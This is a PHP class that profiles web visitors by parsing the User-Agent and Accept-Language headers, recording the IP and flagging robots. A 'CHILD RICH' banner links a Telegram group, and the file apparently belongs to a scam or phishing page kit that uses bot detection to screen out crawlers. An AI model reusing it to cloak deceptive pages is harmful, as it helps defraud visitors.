<?php
/*   __________________________________________________
    |                  CHILD RICH                      |
    |            on 2024-09-23 20:05:17                |
    |    Group : https://t.me/childrichgroup           |
    |__________________________________________________|
*/
class Pc
{
    public $agent = NULL;
    public $is_browser = FALSE;
    public $is_robot = FALSE;
    public $is_mobile = FALSE;
    public $languages = [];
    public $platform = '';
    public $browser = '';
    public $version = '';
    public $mobile = '';
    public $robot = '';
    public $visitorPath = '';
    public $ip_address;

    private $requestHandler;
    public $platforms = [];
    public $browsers = [];
    public $mobiles = [];
    public $robots = [];

    public function __construct()
    {
        $this->requestHandler = new RequestHandler();
        $this->load_agent();

        if (isset($_SERVER['HTTP_USER_AGENT'])) {
            $this->agent = trim($_SERVER['HTTP_USER_AGENT']);
            $this->ip_address = $this->requestHandler->getPublicIP();
            $this->compile_data();
        }
    }

protected function load_agent()
{
    $this->platforms = $this->load_json_file('platforms.json');
    $this->browsers = $this->load_json_file('browsers.json');
    $this->mobiles = $this->load_json_file('mobiles.json');
    $this->robots = $this->load_json_file('robots.json');
}


    protected function load_json_file($filename)
    {
        $filepath = __DIR__ . '/System/' . $filename;
        if (file_exists($filepath)) {
            $data = file_get_contents($filepath);
            $json_data = json_decode($data, true);
    
            if (json_last_error() === JSON_ERROR_NONE) {
                return $json_data;
            } else {
                // Log atau handle error JSON
                error_log("Error decoding JSON in file: " . $filename);
                return [];
            }
        }
        return [];
    }


    protected function compile_data()
    {
        $this->detect_browser();
        $this->detect_platform();
        $this->detect_mobile();
        $this->detect_robot();
        $this->detect_language();
        $this->visitorPath = 'App/Visitor/';
    }

    protected function detect_browser()
    {
        foreach ($this->browsers as $pattern => $name) {
            if (preg_match('/' . $pattern . '/i', $this->agent)) {
                $this->browser = $name;
                $this->is_browser = TRUE;
                break;
            }
        }
    }

    protected function detect_platform()
    {
        foreach ($this->platforms as $pattern => $name) {
            if (preg_match('/' . $pattern . '/i', $this->agent)) {
                $this->platform = $name;
                break;
            }
        }
    }

    protected function detect_mobile()
    {
        foreach ($this->mobiles as $pattern => $name) {
            if (preg_match('/' . $pattern . '/i', $this->agent)) {
                $this->mobile = $name;
                $this->is_mobile = TRUE;
                break;
            }
        }
    }

    protected function detect_robot()
    {
        foreach ($this->robots as $pattern => $name) {
            if (preg_match('/' . $pattern . '/i', $this->agent)) {
                $this->robot = $name;
                $this->is_robot = TRUE;
                break;
            }
        }
    }

    protected function detect_language()
    {
        if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
            $this->languages = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
        }
    }

    public function is_mobile_device()
    {
        return $this->is_mobile;
    }
}
